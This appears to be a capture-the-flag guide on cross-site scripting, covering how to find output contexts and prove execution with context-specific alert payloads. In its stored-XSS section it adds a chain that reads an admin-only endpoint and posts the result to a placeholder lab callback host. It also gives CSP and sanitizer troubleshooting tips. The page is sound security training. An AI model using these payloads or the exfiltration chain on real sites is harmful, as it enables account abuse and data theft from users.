---
title: "XSS · Context Before Payload"
weight: 30
bookToc: true
---

# Cross-site scripting

**Order: marker → locate exact output context → harmless execution proof → bot/admin workflow → read the challenge data.** Reflection in JSON or escaped HTML alone is not XSS.

## 1. Map source and sink

Submit a unique marker such as `CTF_MARK_731`. Search raw HTML, response headers, JS bundles and the live DOM. For stored input, revisit list/detail/moderation/export views. For DOM input, inspect `location.search`, `location.hash`, `postMessage`, storage and JSON fetch responses.

| Sink/context | First question |
| --- | --- |
| HTML text | Are `<` and `>` parsed or encoded? |
| Quoted attribute | Can the matching quote end the value? |
| Unquoted attribute | Can a space create a new attribute? |
| JS string | Which quote, escaping and surrounding expression? |
| URL value | Is the URL scheme controlled and navigation triggered? |
| `innerHTML` / `insertAdjacentHTML` | Does the browser create active HTML? |
| `textContent` | Normally text, not markup execution |
| `eval`, `Function`, string timer | Is input actually evaluated as JavaScript? |

Inspect DOM as well as source: browser HTML parsing can move, normalize or discard malformed markup.

## 2. HTML text: first proof

```html
<b>CTF_MARK_731</b>
<img src=x onerror=alert(731)>
<svg onload=alert(731)>
<script>alert(731)</script>
```

Use the bold marker to establish HTML interpretation, then a distinct execution marker. Scripts inserted through `innerHTML` generally do not execute; event handlers can still execute if permitted by policy. A CSP can block inline handlers and scripts even when markup injection is real.

## 3. Attribute contexts

If output is `<input value="INPUT">`:

```html
" autofocus onfocus=alert(731) x="
"><img src=x onerror=alert(731)>
```

If output uses single quotes:

```html
' autofocus onfocus=alert(731) x='
'><img src=x onerror=alert(731)>
```

For an unquoted value, a whitespace separator can introduce an attribute:

```html
x autofocus onfocus=alert(731)
```

`autofocus` depends on browser behavior, focus state and element support. A new image error is often a clearer probe. Quote encodings such as `&quot;` **inside an existing attribute value** do not normally terminate that attribute: the tokenizer does not reparse decoded quotes as structure.

## 4. JavaScript contexts

For exactly `const name = 'INPUT';` inside an inline script:

```javascript
';alert(731);//
```

For exactly `const name = "INPUT";`:

```javascript
";alert(731);//
```

If untrusted input lands inside an HTML `<script>` element, the HTML parser recognizes its closing tag even while JS thinks it is in a string:

```html
</script><img src=x onerror=alert(731)>
```

That closing-tag route does not apply to external JS files or JSON served as `application/json`. In a JavaScript template literal, an unescaped interpolation may evaluate:

```javascript
${alert(731)}
```

Backslash count matters. Read the **final response bytes**, not just your submitted input. A broken script without controlled execution is a syntax error, not a successful proof.

## 5. URL and DOM sources

Where an actual navigated `href` accepts arbitrary schemes:

```text
javascript:alert(731)
```

This generally requires activation; it is not a generic payload for `<img src>`. A bot may never click links. Protocol validation and CSP can block it.

A typical DOM chain to recognize in client source:

```javascript
const q = new URLSearchParams(location.search).get('q');
document.querySelector('#result').innerHTML = q;
```

Use `?q=%3Cimg%20src%3Dx%20onerror%3Dalert(731)%3E` for that sink. A hash source may decode differently; fragments are visible to client JS and are not sent in HTTP requests. `document.write`, `outerHTML`, jQuery HTML constructors and third-party template renderers need separate context checks.

## 6. Stored XSS / admin bot: complete the chain

1. Determine exactly which URL the bot visits and whether it opens submitted links or a fixed moderation page.
2. Store a proof that triggers without a click if the bot does not interact.
3. Use the bot's same-origin privileges to read a documented challenge endpoint.
4. Send only the intended challenge result to a permitted callback if event rules allow it.

A payload body for a confirmed JavaScript sink:

```javascript
fetch('/admin/flag', {credentials:'same-origin'})
  .then(r => r.text())
  .then(t => fetch('https://YOUR-LAB-HOST/collect', {
    method:'POST', mode:'no-cors', body:t
  }));
```

Place that body in the **proven execution context**, not blindly in every HTML tag. `HttpOnly` prevents reading a cookie through `document.cookie`; it does not stop same-origin requests carrying the cookie. An admin token may instead be in storage or a request header. Cross-origin reading still follows CORS.

`no-cors` produces an opaque response; it does not let JS read an arbitrary origin. A CSP `connect-src` restriction can block the callback. A callback log proves some browser reached you; a unique route/token and returned content are needed to tie it to the bot.

## 7. CSP and sanitization troubleshooting

| Observation | Check next |
| --- | --- |
| Tags show literally | HTML encoding or text sink; locate another render path |
| Image inserted but handler missing | Sanitizer removes event attributes |
| Handler present but no execution | Browser console CSP / sandbox errors |
| `<script>` present but inert | DOM insertion method or script type |
| Works for you, not bot | Timing, login, bot URL, browser version, CSP, no interaction |
| Popup doesn't show | Headless dialogs may be suppressed; use a controlled DOM marker or permitted callback |
| Only `alert` blocked | Identify exact token transformation; do not assume all JS is blocked |
| Encoded payload remains encoded | Wrong decode layer; compare raw bytes and DOM |

Inspect `script-src`, nonces/hashes, `unsafe-inline`, `strict-dynamic`, `connect-src`, iframe `sandbox` and Trusted Types errors. A random nonce cannot be invented. An allowed host is only useful if it has a matching usable script gadget or attacker-controlled script content. Keep a minimal working payload before testing a bypass.

## 8. What to save

Record input location, stored/reflected/DOM type, raw output context, escaping, browser behavior, CSP, bot route and final data source. “`<script>alert(1)</script>` failed” is not a useful diagnosis without its sink.

Related: [SSTI](../ssti/) for server evaluation; [CSRF/CORS](../csrf-cors/) for requests made from another origin.

## Tool workflow

Use [Burp Community Repeater](../../ajcbbc_allow_tools/burp_suite_community/) for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.

## References

[MDN XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS), [MDN innerHTML security considerations](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations), [CSP script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src).
